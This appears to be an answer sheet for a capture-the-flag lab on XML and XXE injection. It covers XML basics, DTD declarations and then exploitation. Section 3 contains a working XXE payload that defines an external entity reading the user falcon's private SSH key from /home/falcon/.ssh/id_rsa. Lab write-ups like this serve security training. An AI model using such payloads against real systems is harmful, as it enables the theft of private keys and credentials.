

### Section 1

#1Full form of XML
```
eXtensible Markup Language
```

#2 Is it compulsory to have XML prolog in XML documents?
```
No
```

#3Can we validate XML documents against a schema?
```
yes
```

#4 How can we specify XML version and encoding in XML document?
```
XML Prolog
```

### Section 2

#1 How do you define a new ELEMENT? 
```
!ELEMENT
```
#2How do you define a ROOT element?
```
!DOCTYPE
```

#3 How do you define a new ENTITY?
```
!ENTITY
```

## Section 3
#1 What is the name of the user in /etc/passwd
```
use the payload
```

#2 Where is falcon's SSH key located?
```
/home/falcon/.ssh/id_rsa
```

#3 What are the first 18 characters for falcon's private key
```
<?xml version="1.0"?>
<!DOCTYPE root [<!ENTITY read SYSTEM 'file:///home/falcon/.ssh/id_rsa'>]>
<root>&read;</root>
```